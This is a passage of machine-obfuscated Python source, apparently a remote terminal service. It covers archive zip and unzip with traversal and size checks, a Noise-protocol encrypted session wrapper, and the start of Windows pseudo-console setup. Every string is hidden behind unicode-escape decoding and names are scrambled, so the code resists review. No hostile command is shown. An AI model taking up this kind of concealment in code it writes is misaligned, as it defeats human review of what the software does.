                O0_var_461.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_462, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0050\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape')})
            except Exception as e:
                O0_var_461.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_462, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(type(e).__name__) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(e)})
        O0_var_472 = sum((1 for O0_var_473 in O0_var_461 if O0_var_473[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u006f\\u006b', 'unicode_escape')))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape') if O0_var_472 > 0 else codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_460), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_472, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_461}

    def create_directory(self, O0_var_474: str) -> dict:
        O0_var_475 = self._safe_path(O0_var_474)
        if O0_var_475.exists():
            raise HTTPException(409, codecs.decode('\\u0045\\u0078\\u0069\\u0073\\u0074\\u0073\\u003a\\u0020', 'unicode_escape') + str(O0_var_474))
        try:
            self._validate_parent_directory(O0_var_475)
            O0_var_475.mkdir(parents=True)
            self._audit(codecs.decode('\\u006d\\u006b\\u0064\\u0069\\u0072', 'unicode_escape'), str(O0_var_475), codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_475.relative_to(self.O0_fn_106))}
        except Exception as e:
            raise FileOperationError(codecs.decode('\\u004d\\u006b\\u0064\\u0069\\u0072\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e), e) from e
    ZIP_MAX_ENTRIES = 20000
    ZIP_MAX_TOTAL_BYTES = 512 * 1024 * 1024
    ZIP_MAX_LISTED_FILES = 500

    def _display_path(self, path: Path) -> str:
        O0_var_476 = path.relative_to(self.O0_fn_106)
        O0_var_477 = str(O0_var_476)
        return O0_var_477 if O0_var_477 else codecs.decode('\\u002e', 'unicode_escape')

    def zip_items(self, O0_var_478: str, O0_var_479: List[str], flat: bool=False) -> dict:
        O0_var_480 = self._safe_path(O0_var_478)
        if O0_var_480.exists() and O0_var_480.is_dir():
            raise HTTPException(400, codecs.decode('\\u0054\\u0061\\u0072\\u0067\\u0065\\u0074\\u0020\\u0069\\u0073\\u0020\\u0061\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079\\u003a\\u0020', 'unicode_escape') + str(O0_var_478))
        if not O0_var_479:
            raise HTTPException(400, codecs.decode('\\u0069\\u0074\\u0065\\u006d\\u0073\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u0020\\u0028\\u006e\\u006f\\u006e\\u002d\\u0065\\u006d\\u0070\\u0074\\u0079\\u0020\\u0061\\u0072\\u0072\\u0061\\u0079\\u0029', 'unicode_escape'))
        O0_var_481 = []
        O0_var_482 = 0
        O0_var_483 = False
        try:
            self._validate_parent_directory(O0_var_480)
            O0_var_480.parent.mkdir(parents=True, exist_ok=True)
            if O0_var_480.exists():
                O0_var_480.unlink()
            with zipfile.ZipFile(O0_var_480, codecs.decode('\\u0077', 'unicode_escape'), zipfile.ZIP_DEFLATED) as O0_var_484:
                O0_var_485 = 0

                def add_entry(O0_var_486) -> bool:
                    nonlocal O0_var_485
                    if O0_var_485 >= self.ZIP_MAX_ENTRIES:
                        return False
                    try:
                        O0_var_486()
                    except (FileOperationError, _ZipSourceReadError):
                        raise
                    except Exception as e:
                        raise FileOperationError(codecs.decode('\\u005a\\u0069\\u0070\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e), e) from e
                    O0_var_485 += 1
                    return True

                def add_file(path: Path, O0_var_487: str) -> bool:
                    if O0_var_485 >= self.ZIP_MAX_ENTRIES:
                        return False
                    with path.open(codecs.decode('\\u0072\\u0062', 'unicode_escape')) as O0_var_488:

                        def write_source():
                            with O0_var_484.open(O0_var_487, codecs.decode('\\u0077', 'unicode_escape')) as O0_var_489:
                                while True:
                                    try:
                                        O0_var_490 = O0_var_488.read(1024 * 1024)
                                    except Exception as e:
                                        raise _ZipSourceReadError(str(e)) from e
                                    if not O0_var_490:
                                        break
                                    O0_var_489.write(O0_var_490)
                        return add_entry(write_source)
                for O0_var_491 in O0_var_479:
                    if O0_var_483:
                        O0_var_481.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_491, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0073\\u006b\\u0069\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): 0})
                        continue
                    try:
                        O0_var_492 = self._safe_path(O0_var_491)
                        if not O0_var_492.exists():
                            O0_var_481.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_491, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006e\\u006f\\u0074\\u005f\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): 0})
                            continue
                        O0_var_493 = PurePosixPath(O0_var_491.replace(codecs.decode('\\u005c', 'unicode_escape'), codecs.decode('\\u002f', 'unicode_escape')).strip(codecs.decode('\\u002f', 'unicode_escape'))).name or codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape')
                        O0_var_494 = 0
                        if O0_var_492.is_file():
                            if not add_file(O0_var_492, O0_var_493):
                                O0_var_483 = True
                                O0_var_481.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_491, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0073\\u006b\\u0069\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): 0})
                                continue
                            O0_var_494 = 1
                        elif O0_var_492.is_dir():
                            O0_var_495 = codecs.decode('', 'unicode_escape') if flat else O0_var_493
                            O0_var_496 = False
                            O0_var_497 = sorted(O0_var_492.rglob(codecs.decode('\\u002a', 'unicode_escape')), key=lambda x: len(x.parts))
                            if any((O0_var_498.is_symlink() for O0_var_498 in O0_var_497)):
                                raise OSError(codecs.decode('\\u0073\\u0079\\u006d\\u0062\\u006f\\u006c\\u0069\\u0063\\u0020\\u006c\\u0069\\u006e\\u006b\\u0020\\u006e\\u006f\\u0074\\u0020\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u0069\\u006e\\u0020\\u0072\\u0065\\u0063\\u0075\\u0072\\u0073\\u0069\\u0076\\u0065\\u0020\\u007a\\u0069\\u0070', 'unicode_escape'))
                            for O0_var_499 in O0_var_497:
                                O0_var_500 = codecs.decode('\\u002f', 'unicode_escape').join(([O0_var_495] if O0_var_495 else []) + list(O0_var_499.relative_to(O0_var_492).parts))
                                if O0_var_499.is_dir():
                                    if not add_entry(lambda a=O0_var_500: O0_var_484.writestr(zipfile.ZipInfo(a + codecs.decode('\\u002f', 'unicode_escape')), b'')):
                                        O0_var_496 = True
                                        break
                                else:
                                    if not add_file(O0_var_499, O0_var_500):
                                        O0_var_496 = True
                                        break
                                    O0_var_494 += 1
                            if O0_var_496:
                                O0_var_483 = True
                                O0_var_482 += O0_var_494
                                O0_var_481.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_491, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0072\\u0074\\u0069\\u0061\\u006c', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): O0_var_494})
                                continue
                        else:
                            O0_var_481.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_491, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0055\\u006e\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u0066\\u0069\\u006c\\u0065\\u0020\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0061\\u0073\\u006f\\u006e', 'unicode_escape'): codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape')})
                            continue
                        O0_var_482 += O0_var_494
                        O0_var_481.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_491, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): O0_var_494})
                        self._audit(codecs.decode('\\u007a\\u0069\\u0070', 'unicode_escape'), O0_var_491, codecs.decode('\\u006f\\u006b', 'unicode_escape'))
                    except FileOperationError:
                        raise
                    except HTTPException as e:
                        O0_var_481.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_491, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u006f\\u0075\\u0074\\u0073\\u0069\\u0064\\u0065\\u0020\\u0066\\u0069\\u006c\\u0065\\u0020\\u0072\\u006f\\u006f\\u0074', 'unicode_escape') if e.status_code == 403 else str(e.detail), codecs.decode('\\u0072\\u0065\\u0061\\u0073\\u006f\\u006e', 'unicode_escape'): _file_error_reason(e)})
                    except Exception as e:
                        O0_var_481.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_491, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e), codecs.decode('\\u0072\\u0065\\u0061\\u0073\\u006f\\u006e', 'unicode_escape'): _file_error_reason(e)})
            O0_var_501 = O0_var_480.stat().st_size
        except HTTPException:
            raise
        except Exception as e:
            raise FileOperationError(codecs.decode('\\u005a\\u0069\\u0070\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e), e) from e
        O0_var_502 = sum((1 for O0_var_503 in O0_var_481 if O0_var_503[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')))
        O0_var_504 = sum((1 for O0_var_505 in O0_var_481 if O0_var_505[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] in (codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0072\\u0074\\u0069\\u0061\\u006c', 'unicode_escape'))))
        O0_var_506 = codecs.decode('\\u006f\\u006b', 'unicode_escape')
        if O0_var_502:
            O0_var_506 = codecs.decode('\\u0070\\u0061\\u0072\\u0074\\u0069\\u0061\\u006c', 'unicode_escape') if O0_var_504 else codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')
        response = {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): O0_var_506, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): self._display_path(O0_var_480), codecs.decode('\\u0065\\u006e\\u0074\\u0072\\u0069\\u0065\\u0073', 'unicode_escape'): O0_var_482, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_501, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_481}
        if O0_var_502:
            response[codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape')] = str(O0_var_502) + codecs.decode('\\u0020\\u006f\\u0066\\u0020', 'unicode_escape') + str(len(O0_var_481)) + codecs.decode('\\u0020\\u0069\\u0074\\u0065\\u006d\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')
        return response

    def unzip_archive(self, O0_var_507: str, dest_path: Optional[str]=None, overwrite: bool=True, entries: Optional[List[str]]=None) -> dict:
        O0_var_508 = self._safe_path(O0_var_507)
        if not O0_var_508.exists():
            raise HTTPException(400, codecs.decode('\\u005a\\u0069\\u0070\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(O0_var_507))
        if O0_var_508.is_dir():
            raise HTTPException(400, codecs.decode('\\u0050\\u0061\\u0074\\u0068\\u0020\\u0069\\u0073\\u0020\\u0061\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079\\u003a\\u0020', 'unicode_escape') + str(O0_var_507))
        if dest_path:
            O0_var_509 = self._safe_path(dest_path)
            if O0_var_509.exists() and (not O0_var_509.is_dir()):
                raise HTTPException(400, codecs.decode('\\u0044\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0069\\u0073\\u0020\\u0061\\u0020\\u0066\\u0069\\u006c\\u0065\\u003a\\u0020', 'unicode_escape') + str(dest_path))
        else:
            O0_var_509 = O0_var_508.parent
        O0_var_510 = [O0_var_511 for O0_var_511 in entries or [] if O0_var_511] if entries else None
        O0_var_512 = O0_var_509.resolve()
        O0_var_513 = 0
        O0_var_514 = 0
        O0_var_515: List[str] = []
        O0_var_516 = False
        O0_var_517 = 0
        try:
            self._validate_parent_directory(O0_var_509)
            O0_var_509.mkdir(parents=True, exist_ok=True)
            with zipfile.ZipFile(O0_var_508) as O0_var_518:
                for O0_var_519 in O0_var_518.infolist():
                    if O0_var_519.filename.endswith(codecs.decode('\\u002f', 'unicode_escape')):
                        continue
                    if O0_var_513 + O0_var_514 >= self.ZIP_MAX_ENTRIES or O0_var_517 >= self.ZIP_MAX_TOTAL_BYTES:
                        O0_var_514 += 1
                        continue
                    if O0_var_510:
                        O0_var_520 = O0_var_519.filename.replace(codecs.decode('\\u005c', 'unicode_escape'), codecs.decode('\\u002f', 'unicode_escape'))
                        O0_var_521 = O0_var_520.rsplit(codecs.decode('\\u002f', 'unicode_escape'), 1)[-1]
                        if O0_var_520 not in O0_var_510 and O0_var_521 not in O0_var_510:
                            O0_var_514 += 1
                            continue
                    if O0_var_519.flag_bits & 1:
                        O0_var_514 += 1
                        continue
                    O0_var_522 = (O0_var_509 / O0_var_519.filename).resolve()
                    try:
                        O0_var_522.relative_to(O0_var_512)
                    except ValueError:
                        O0_var_514 += 1
                        continue
                    if not overwrite and O0_var_522.exists():
                        O0_var_514 += 1
                        continue
                    if O0_var_517 + O0_var_519.file_size > self.ZIP_MAX_TOTAL_BYTES:
                        O0_var_514 += 1
                        continue
                    O0_var_523 = False
                    try:
                        self._validate_parent_directory(O0_var_522)
                        O0_var_522.parent.mkdir(parents=True, exist_ok=True)
                        with O0_var_518.open(O0_var_519) as O0_var_524:
                            O0_var_525 = open(O0_var_522, codecs.decode('\\u0077\\u0062', 'unicode_escape'))
                            O0_var_523 = True
                            with O0_var_525:
                                O0_var_526 = self.ZIP_MAX_TOTAL_BYTES - O0_var_517
                                O0_var_527 = 0
                                while True:
                                    O0_var_528 = O0_var_524.read(min(1024 * 1024, O0_var_526 + 1))
                                    if not O0_var_528:
                                        break
                                    if len(O0_var_528) > O0_var_526:
                                        raise OSError(codecs.decode('\\u007a\\u0069\\u0070\\u0020\\u0065\\u006e\\u0074\\u0072\\u0079\\u0020\\u0065\\u0078\\u0063\\u0065\\u0065\\u0064\\u0073\\u0020\\u0074\\u006f\\u0074\\u0061\\u006c\\u0020\\u0065\\u0078\\u0074\\u0072\\u0061\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074', 'unicode_escape'))
                                    O0_var_525.write(O0_var_528)
                                    O0_var_527 += len(O0_var_528)
                                    O0_var_526 -= len(O0_var_528)
                        O0_var_513 += 1
                        O0_var_517 += O0_var_527
                        if len(O0_var_515) < self.ZIP_MAX_LISTED_FILES:
                            O0_var_515.append(self._display_path(O0_var_522))
                        else:
                            O0_var_516 = True
                        self._audit(codecs.decode('\\u0075\\u006e\\u007a\\u0069\\u0070', 'unicode_escape'), O0_var_519.filename, codecs.decode('\\u006f\\u006b', 'unicode_escape'))
                    except Exception as e:
                        if O0_var_523:
                            try:
                                O0_var_522.unlink()
                            except OSError:
                                pass
                        raise FileOperationError(codecs.decode('\\u0055\\u006e\\u007a\\u0069\\u0070\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e), e) from e
        except FileOperationError:
            raise
        except zipfile.BadZipFile:
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u007a\\u0069\\u0070\\u0020\\u0066\\u0069\\u006c\\u0065\\u003a\\u0020', 'unicode_escape') + str(O0_var_507))
        except HTTPException:
            raise
        except Exception as e:
            raise FileOperationError(codecs.decode('\\u0055\\u006e\\u007a\\u0069\\u0070\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e), e) from e
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): self._display_path(O0_var_508), codecs.decode('\\u0064\\u0065\\u0073\\u0074', 'unicode_escape'): self._display_path(O0_var_509), codecs.decode('\\u0065\\u0078\\u0074\\u0072\\u0061\\u0063\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_513, codecs.decode('\\u0073\\u006b\\u0069\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'): O0_var_514, codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): O0_var_515, codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073\\u005f\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_516}

class NoiseSessionWrapper:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u5c01\\u88c5\\u7c7b\\u0020\\u0028\\u9ed1\\u76d2\\u72b6\\u6001\\u673a\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u4e1a\\u52a1\\u5c42\\u65e0\\u9700\\u5173\\u5fc3\\u5e95\\u5c42\\u7684\\u63e1\\u624b\\u7ec6\\u8282\\uff0c\\u76f4\\u63a5\\u8c03\\u7528\\u5bf9\\u5e94\\u65b9\\u6cd5\\u5373\\u53ef\\u3002\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, is_initiator: bool, local_priv_b64: str, expected_remote_pub_b64: str=None):
        self.noise = NoiseConnection.from_name(b'Noise_XX_25519_ChaChaPoly_BLAKE2s')
        if is_initiator:
            self.noise.set_as_initiator()
        else:
            self.noise.set_as_responder()
        if local_priv_b64:
            O0_var_529 = base64.b64decode(local_priv_b64)
            self.noise.set_keypair_from_private_bytes(Keypair.STATIC, O0_var_529)
        if expected_remote_pub_b64:
            O0_var_530 = base64.b64decode(expected_remote_pub_b64)
            self.noise.set_keypair_from_public_bytes(Keypair.REMOTE_STATIC, O0_var_530)
            self.expected_remote_pub = O0_var_530
        else:
            self.expected_remote_pub = None
        self.captured_remote_pub: Optional[bytes] = None
        self.noise.set_prologue(b'kisama_terminal_v1')
        self.noise.start_handshake()

    @property
    def is_established(self) -> bool:
        return self.noise.handshake_finished

    def process_handshake(self, O0_var_531: bytes) -> bytes:
        if O0_var_531:
            self._read_message_capture_rs(O0_var_531)
        if not self.noise.handshake_finished:
            return self.noise.write_message(b'')
        else:
            return b''

    def _read_message_capture_rs(self, O0_var_532: bytes) -> None:
        O0_var_533 = self.noise.noise_protocol
        O0_var_534 = O0_var_533.keypair_class
        O0_var_535: Dict[str, bytes] = {}

        class _CapturingKeyPair(O0_var_534):

            @classmethod
            def from_public_bytes(cls, data):
                O0_var_535[codecs.decode('\\u0070\\u0075\\u0062', 'unicode_escape')] = bytes(data)
                return super().from_public_bytes(data)
        O0_var_533.keypair_class = _CapturingKeyPair
        try:
            self.noise.read_message(O0_var_532)
        finally:
            if hasattr(O0_var_533, codecs.decode('\\u006b\\u0065\\u0079\\u0070\\u0061\\u0069\\u0072\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073', 'unicode_escape')):
                O0_var_533.keypair_class = O0_var_534
        self.captured_remote_pub = O0_var_535.get(codecs.decode('\\u0070\\u0075\\u0062', 'unicode_escape'))

    def encrypt(self, O0_var_536: bytes) -> bytes:
        if not self.is_established:
            raise RuntimeError(codecs.decode('\\u63e1\\u624b\\u672a\\u5b8c\\u6210\\uff0c\\u65e0\\u6cd5\\u52a0\\u5bc6\\u6570\\u636e', 'unicode_escape'))
        return self.noise.encrypt(O0_var_536)

    def decrypt(self, O0_var_537: bytes) -> bytes:
        if not self.is_established:
            raise RuntimeError(codecs.decode('\\u63e1\\u624b\\u672a\\u5b8c\\u6210\\uff0c\\u65e0\\u6cd5\\u89e3\\u5bc6\\u6570\\u636e', 'unicode_escape'))
        return self.noise.decrypt(O0_var_537)
_IS_WINDOWS = os.name == codecs.decode('\\u006e\\u0074', 'unicode_escape')
if _IS_WINDOWS:
    import ctypes
    import msvcrt
    from ctypes import wintypes
    _PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 131094
    _EXTENDED_STARTUPINFO_PRESENT = 524288
    _CREATE_UNICODE_ENVIRONMENT = 1024
    _CREATE_NO_WINDOW_FLAG = getattr(subprocess, codecs.decode('\\u0043\\u0052\\u0045\\u0041\\u0054\\u0045\\u005f\\u004e\\u004f\\u005f\\u0057\\u0049\\u004e\\u0044\\u004f\\u0057', 'unicode_escape'), 0)
    _STARTF_USESTDHANDLES = 256

    class _COORD(ctypes.Structure):
        _fields_ = [(codecs.decode('\\u0058', 'unicode_escape'), ctypes.c_short), (codecs.decode('\\u0059', 'unicode_escape'), ctypes.c_short)]

    class _PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [(codecs.decode('\\u0068\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0068\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0064\\u0077\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0049\\u0064', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0049\\u0064', 'unicode_escape'), wintypes.DWORD)]

    class _STARTUPINFOEX(ctypes.Structure):
        _fields_ = [(codecs.decode('\\u0063\\u0062', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u006c\\u0070\\u0052\\u0065\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064', 'unicode_escape'), wintypes.LPWSTR), (codecs.decode('\\u006c\\u0070\\u0044\\u0065\\u0073\\u006b\\u0074\\u006f\\u0070', 'unicode_escape'), wintypes.LPWSTR), (codecs.decode('\\u006c\\u0070\\u0054\\u0069\\u0074\\u006c\\u0065', 'unicode_escape'), wintypes.LPWSTR), (codecs.decode('\\u0064\\u0077\\u0058', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0059', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0058\\u0053\\u0069\\u007a\\u0065', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0059\\u0053\\u0069\\u007a\\u0065', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0058\\u0043\\u006f\\u0075\\u006e\\u0074\\u0043\\u0068\\u0061\\u0072\\u0073', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0059\\u0043\\u006f\\u0075\\u006e\\u0074\\u0043\\u0068\\u0061\\u0072\\u0073', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0046\\u0069\\u006c\\u006c\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0046\\u006c\\u0061\\u0067\\u0073', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0077\\u0053\\u0068\\u006f\\u0077\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077', 'unicode_escape'), wintypes.WORD), (codecs.decode('\\u0063\\u0062\\u0052\\u0065\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064\\u0032', 'unicode_escape'), wintypes.WORD), (codecs.decode('\\u006c\\u0070\\u0052\\u0065\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064\\u0032', 'unicode_escape'), ctypes.c_void_p), (codecs.decode('\\u0068\\u0053\\u0074\\u0064\\u0049\\u006e\\u0070\\u0075\\u0074', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0068\\u0053\\u0074\\u0064\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0068\\u0053\\u0074\\u0064\\u0045\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u006c\\u0070\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u004c\\u0069\\u0073\\u0074', 'unicode_escape'), ctypes.c_void_p)]

    def _probe_conpty():
        try:
            O0_var_538 = ctypes.WinDLL(codecs.decode('\\u006b\\u0065\\u0072\\u006e\\u0065\\u006c\\u0033\\u0032', 'unicode_escape'), use_last_error=True)
        except Exception:
            return None
